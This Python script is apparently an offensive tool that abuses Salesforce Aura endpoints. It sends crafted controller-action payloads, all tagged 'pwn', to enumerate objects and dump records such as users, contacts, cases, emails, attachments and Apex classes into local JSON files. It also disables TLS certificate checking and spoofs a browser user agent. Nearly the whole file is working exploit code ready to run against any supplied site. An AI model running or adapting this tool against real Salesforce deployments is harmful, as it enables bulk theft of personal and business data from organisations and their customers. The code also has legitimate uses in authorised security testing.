import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import json
from json import JSONDecodeError
import argparse
import os
import sys
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

PAYLOAD_PULL_CUSTOM_OBJ = json.dumps({
  "actions": [
    {
      "id": "pwn",
      "descriptor": "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData",
      "callingDescriptor": "UNKNOWN",
      "params": {}
    }
  ]
})

SF_OBJECT_NAME = (
    'Case', 'Account', 'User', 'Contact', 'Document', 'ContentDocument',
    'ContentVersion', 'ContentBody', 'CaseComment', 'Note', 'Employee',
    'Attachment', 'EmailMessage', 'CaseExternalDocument', 'Lead', 'Name',
    'EmailTemplate', 'EmailMessageRelation'
)

DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000
DEFAULT_PAGE = 1

# Dump "ApexClass" must be limited to 25
APEX_PAGE_SIZE = 25

USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'


class Aura:
    def __init__(self, url, context, token, proxy, output_dir, cookie=None):
        self.__url = url
        self.__cookie = cookie
        self.__context = context
        self.__token = token
        self.__proxy = proxy
        self.__output_dir = output_dir


    def http_request(self, url, raw_post_body=None, method='GET'):
        """
        Send an HTTP request (GET or POST) using urllib.
        * raw_post_body: if not None, it is sent verbatim as the POST body (no urllib encoding).
        """
        headers = {
            'User-Agent': USER_AGENT
        }
        if self.__cookie:
            headers['Cookie'] = self.__cookie

        if method == 'POST':
            # We assume raw_post_body is already a bytes object.
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = raw_post_body
            request = urllib.request.Request(url, data=data, method=method, headers=headers)
        else:
            request = urllib.request.Request(url, method=method, headers=headers)

        if self.__proxy:
            proxy_handler = urllib.request.ProxyHandler({'http': self.__proxy, 'https': self.__proxy})
        else:
            proxy_handler = urllib.request.ProxyHandler({})  # no system defaults

        opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPSHandler(context=ctx))

        try:
            with opener.open(request) as response:
                response_body = response.read().decode("utf-8")
            return response_body
        except URLError as e:
            raise e


    def exploit(self, payload, proxy=None):
        """
        Sends the exploit payload to the provided Aura endpoint WITHOUT URL-encoding
        aura.context or aura.token. We build the POST body manually.
        """
        endpoint_url = self.__url + '?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1'

        # Build POST body manually as a plain string:
        # message=<payload>&aura.context=<context>&aura.token=<token>
        post_body_str = (
            "message=" + payload +
            "&aura.context=" + self.__context +
            "&aura.token=" + self.__token
        )
        raw_post_body = post_body_str.encode('utf-8')

        try:
            response_body = self.http_request(
                endpoint_url,
                raw_post_body=raw_post_body,
                method='POST',
            )

            response_json = json.loads(response_body)
        except JSONDecodeError:
            raise Exception("JSON Decode error. Response -> %s" % response_body)
        except Exception as e:
            raise e

        return response_json


    def get_output_dir(self):
        if self.__output_dir != None:
            return self.__output_dir

        parsed_url = urllib.parse.urlparse(self.__url)
        url_path_sanitised = parsed_url.path.strip('/').replace('/', '_') or "root"
        netloc_sanitised = parsed_url.netloc.replace(':', '_')
        return os.path.join(
            os.getcwd(), parsed_url.scheme + "_" + netloc_sanitised + "_" + url_path_sanitised
        )


    def get_objects(self, object_name, page_size=DEFAULT_PAGE_SIZE, page=DEFAULT_PAGE):
        """
        Retrieves and prints a single page of the specified object.
        """
        payload = create_payload_for_getItems(object_name, page_size, page)

        try:
            response = self.exploit(payload)
            if response.get('exceptionEvent'):
                raise Exception(response)
        except Exception as e:
            print("[-] Failed to retrieve or exploit.")
            print("[-] Error:", e)
            return None

        actions = response.get('actions', [])
        if not actions:
            return None

        action_data = actions[0]
        state = action_data.get('state')

        if state == "ERROR":
            errors = action_data.get('error', [])
            print("[-] Error message:", extract_error_message(errors))
            return None

        return_value = action_data.get('returnValue', {})

        total_count = return_value.get('totalCount', "None")
        results = return_value.get('result', [])
        if len(results) != 0:
            return response
        else:
            return None


    def list_objects(self):
        response = self.exploit(PAYLOAD_PULL_CUSTOM_OBJ)
        if response.get('exceptionEvent'):
            raise Exception(response)

        actions = response.get('actions', [])
        if not actions or actions[0].get('state') is None:
            raise Exception("Failed to get actions: %s" % response)

        return_value = actions[0].get('returnValue', {})
        object_names = return_value.get("apiNamesToKeyPrefixes", {})

        return sorted(list(object_names.keys()))


    def write_object(self, object_name, page, value):

        output_dir = self.get_output_dir()

        os.makedirs(output_dir, exist_ok=True)

        file_path = os.path.join(
            output_dir,
            f"{object_name}__page{page}.json"
        )

        with open(file_path, "w", encoding="utf_8") as fw:
            fw.write(json.dumps(value, ensure_ascii=False, indent=2))


def create_payload_for_getItems(object_name, page_size, page):
    """
    Creates the JSON message body used to request object items (lists).
    """
    payload = json.dumps({
        "actions": [{
            "id": "pwn",
            "descriptor": "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
            "callingDescriptor": "UNKNOWN",
            "params": {
                "entityNameOrId": object_name,
                "layoutType": "FULL",
                "pageSize": page_size,
                "currentPage": page,
                "useTimeout": False,
                "getCount": True,
                "enableRowActions": False
            }
        }]
    })
    return payload


def create_payload_for_getRecord(record_id):
    """
    Creates the JSON message body used to request details for a specific record.
    """
    payload = json.dumps({
        'actions': [{
            'id': 'pwn',
            'descriptor': 'serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord',
            'callingDescriptor': 'UNKNOWN',
            'params': {
                'recordId': record_id,
                'record': None,
                'inContextOfComponent': '',
                'mode': 'VIEW',
                'layoutType': 'FULL',
                'defaultFieldValues': None,
                'navigationLocation': 'LIST_VIEW_ROW'
            }
        }]
    })
    return payload


def calc_page_size(dump_full, object_name):
    if object_name == 'ApexClass':
        return APEX_PAGE_SIZE
    elif dump_full == True:
        return MAX_PAGE_SIZE
    else:
        return DEFAULT_PAGE_SIZE


# Extract the error from Salesforce aura responses
def extract_error_message(errors):

    try:
        raw_error = errors[0]['event']['attributes']['values']['message']
        # Some error messages have new lines which makes error logging ugly
        return raw_error.replace('\n', ' ')
    except (IndexError, KeyError):
        return 'Unknown error'


def handle_dump_record(aura, record_id):
    """
    Dumps a single record by record ID.
    """
    print(f"[+] Dumping record: {record_id}")
    payload = create_payload_for_getRecord(record_id)

    try:
        response = aura.exploit(payload)
    except Exception as e:
        print("[-] Failed to dump the record.")
        print("[-] Error:", e)
        return None

    actions = response.get('actions', [{}])
    if not actions or actions[0].get('state') != "SUCCESS":
        print("[-] Record dump did not succeed (state != SUCCESS).")
        return None

    print("[+] State:", actions[0].get('state'))
    print("[+] Record result:")
    print(json.dumps(actions[0].get('returnValue'), ensure_ascii=False, indent=2))


# Dumps all discovered objects to JSON files in `output_dir`.
def handle_dump_objects(aura, object_names=None, dump_full=False, display=False, object_type='both'):

    if object_names == None:
        all_objects = aura.list_objects()
        
        # Filter objects based on object_type parameter
        if object_type == 'default':
            object_names = list(filter(lambda x: not x.endswith('__c'), all_objects))
        elif object_type == 'custom':
            object_names = list(filter(lambda x: x.endswith('__c'), all_objects))
        else:  # object_type == 'both'
            object_names = all_objects
            
        print(f"[+] Filtering objects by type: {object_type}")
        print(f"[+] Found {len(object_names)} objects to dump")
    
    failed_objects = []

    for num, object_name in enumerate(object_names):
        page = DEFAULT_PAGE
        page_size = calc_page_size(dump_full, object_name)

        while True:

            print("[+] {}/{}) Getting '{}' object (page {})...".format(
                num+1,
                len(object_names),
                object_name,
                page
            ))

            response = aura.get_objects(object_name, page_size, page)
            if response is None:
                failed_objects.append(object_name)
                break

            # response['actions'][0]['returnValue']
            return_value = response.get('actions', [{}])[0].get('returnValue', {})
            aura.write_object(object_name, page, return_value)

            if display == True:
                print(json.dumps(return_value, ensure_ascii=False, indent=2))

            page += 1

            if not dump_full or not return_value.get('result'):
                break

            if len(return_value['result']) < page_size:
                break

    if failed_objects:
        print("[-] Failed to dump:", ", ".join(failed_objects))


def handle_list_objects(aura):

    objects_list = aura.list_objects()

    default_objects = list(filter(lambda x: not x.endswith('__c'), objects_list))
    custom_objects = list(filter(lambda x: x.endswith('__c'), objects_list))

    print(f'[+] Found {len(objects_list)} objects')
    print(f'[+] > {len(default_objects)} default salesforce objects')
    print(f'[+] > {len(custom_objects)} custom salesforce objects')

    print('[+] Default objects:')
    print('\n'.join(default_objects))
    print('[+] Custom objects:')
    print('\n'.join(custom_objects))


def init():
    parser = argparse.ArgumentParser(
        description="Exploit Salesforce via a user-supplied Aura endpoint, using a required aura_context and token."
    )

    parser.add_argument(
        '-u', '--url',
        required=True,
        help=(
            "Set the *full* Aura endpoint URL, e.g. "
            "https://example.force.com/sfsites/aura"
        )
    )
    parser.add_argument(
        '-A', '--aura-context',
        required=True,
        help='The full JSON/string for the aura.context field (no encoding).'
    )
    parser.add_argument(
        '-T', '--token',
        required=True,
        help='The aura.token value (no encoding).'
    )
    parser.add_argument(
        '-o', '--objects',
        help=(
            "Specify object name(s) to dump. Default: ['User']. "
            "Other interesting objects: " + ", ".join(SF_OBJECT_NAME)
        ),
        nargs='*',
        default=['User']
    )
    parser.add_argument(
        '-l', '--listobj',
        help='Pull and print the object list from the given endpoint.',
        action='store_true'
    )
    parser.add_argument(
        '-r', '--record-id',
        help='If specified, dumps the given recordId from the Aura endpoint.'
    )
    parser.add_argument(
        '-d', '--dump-objects',
        help='Dump objects accessible to current user (small subset of pages) and save to file.',
        action='store_true'
    )
    parser.add_argument(
        '--object-type',
        choices=['default', 'custom', 'both'],
        default='both',
        help='When using -d, specify which type of objects to dump: default, custom, or both (default: both)'
    )
    parser.add_argument(
        '-f', '--full',
        help='If set with -d, attempts to dump *all pages* of objects.',
        action='store_true'
    )
    parser.add_argument(
        '--cookie',
        help='Specify a Cookie header for authentication if needed.'
    )
    parser.add_argument(
        '--proxy',
        help='Specify a proxy server, e.g. http://127.0.0.1:8080'
    )
    parser.add_argument(
        '--apex',
        help='Dump all ApexClass entries.',
        action='store_true'
    )
    parser.add_argument(
        '--output-dir',
        help='The directory to output the results',
    )
    return parser.parse_args()


def main():
    args = init()

    print("[+] Starting exploit with user-supplied aura_context and token (no URL encoding)...")

    aura_url = args.url
    aura_context = args.aura_context
    aura_token = args.token

    aura = Aura(
        url=aura_url,
        context=aura_context,
        token=aura_token,
        proxy=args.proxy,
        cookie=args.cookie,
        output_dir=args.output_dir,
    )

    # If user wants to list objects
    if args.listobj:
        handle_list_objects(aura)

    # If user wants a single record
    elif args.record_id:
        handle_dump_record(aura, args.record_id)

    # If user wants to dump all objects
    elif args.dump_objects:
        handle_dump_objects(aura, dump_full=args.full, object_type=args.object_type)

    elif args.apex:
        handle_dump_objects(aura, object_names=['ApexClass'], dump_full=True, object_type='both')

    else:
        handle_dump_objects(
            aura, object_names=args.objects, dump_full=args.full, display=True, object_type='both'
        )

if __name__ == "__main__":
    main()
